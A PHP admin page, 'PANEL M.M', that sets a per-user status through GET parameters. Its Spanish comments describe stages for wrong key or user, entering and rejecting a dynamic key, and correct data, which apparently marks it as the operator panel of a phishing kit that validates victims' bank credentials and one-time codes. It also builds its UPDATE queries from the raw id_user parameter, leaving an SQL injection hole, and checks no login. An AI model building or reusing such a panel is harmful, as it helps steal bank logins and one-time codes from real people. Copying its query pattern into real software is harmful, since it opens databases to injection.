<?php
  $v = rand(9,99999);
  if (isset($_GET["id_user"]) && isset($_GET["op"]) ) {
  	?>

  	<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>PANEL - M M v1</title>

	<link rel="stylesheet" href="css/style.css?v=<?php echo $v; ?>">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Bad+Script&family=Gruppo&family=Kumar+One+Outline&family=Londrina+Outline&family=Sriracha&display=swap" rel="stylesheet">
</head>
<body>

	<header class="text-center bg-dark">
    <x-sign></x-sign> <x-sign></x-sign>
    <x-sign>
      PANEL M.M
    </x-sign>

    <x-sign></x-sign><x-sign><<< Version 2.0 >>></x-sign>
  </header>
  

	<div class="container mt-5">
		
		<div class="row">
			<div class="col-md-6">
				<h3>GESTION USUARIO:</h3>
			</div>
			<div class="col-md-6">
				<a href="index.php" class="btn btn-danger">Regresar</a>
			</div>
		</div>
		<hr>

		<br><br>
		<div class="mt-5 text-center">
			<div class="sk-folding-cube">
			  <div class="sk-cube1 sk-cube"></div>
			  <div class="sk-cube2 sk-cube"></div>
			  <div class="sk-cube4 sk-cube"></div>
			  <div class="sk-cube3 sk-cube"></div>
			</div>
			<h5>CARGANDO</h5>
		</div>

	</div>


	<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>	
	<script type="text/javascript" src="js/script.js"></script>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>



  	<?php
  	$mysqli = include_once "conexion/conexion.php";
  	//  1 = no se ha validado nada
  	//  2 = CALVE O USUARIO INCORRECTO
  	//  3 INGRESAR DINAMICA
  	//  4 DINAMICA INCORRECTA
  	//  5 DATOS CORRECTOS

  	if ($_GET["op"] == 1) {
  		
  		$estado = 2; // CALVE O USUARIO INCORRECTO
  		$id = $_GET["id_user"];
  		$response = false;

  		$sentencia = $mysqli->prepare("UPDATE  usuarios SET estado = $estado where id = $id");		

  		if($sentencia->execute()){
  			$response = true;
  		}
  		else{$response = false;}

  		$sentencia->close();

  		if ($response == true) {
  		?>
  		<script type="text/javascript">
        window.location.href='index.php';
  		</script>
  		<?php
  		} else{
  			print_r("error");
  		}
  		


  	} else if ($_GET["op"] == 2){

  		$estado = 4; // DINAMICA INCORRECTA
  		$id = $_GET["id_user"];
  		$response = false;

  		$sentencia = $mysqli->prepare("UPDATE  usuarios SET estado = $estado where id = $id");		

  		if($sentencia->execute()){
  			$response = true;
  		}
  		else{$response = false;}

  		$sentencia->close();

  		if ($response == true) {
  		?>
  		<script type="text/javascript">
  			window.location.href='index.php';
  		</script>
  		<?php
  		} else{
  			print_r("error");
		  }

  	} else if ($_GET["op"] == 3){

  		$id = $_GET["id_user"];
  		$response = false;
      $estado = 0;

      $stmt = $mysqli->prepare("SELECT * FROM usuarios WHERE id = ?");
      $stmt->bind_param("i", $id);
      $stmt->execute();
      $resultado = $stmt->get_result();
      $usuario = $resultado->fetch_assoc();


      if ($usuario["estado"] == 1 || $usuario["estado"] == 2) {

          $estado = 3;
        
      } else  if ($usuario["estado"] == 3 || $usuario["estado"] == 4){
          $estado = 5;
      } else{
         $estado = 5;
      }


      $sentencia = $mysqli->prepare("UPDATE  usuarios SET estado = $estado where id = $id");    

      if($sentencia->execute()){
        $response = true;
      }
      else{$response = false;}

      $sentencia->close();

      if ($response == true) {
      ?>
      <script type="text/javascript">
        window.location.href='index.php';
      </script>
      <?php

  	  }
    }

?>
</body>
</html>


<?php


  }else{
  	header("location: index.php");
  }


 ?>


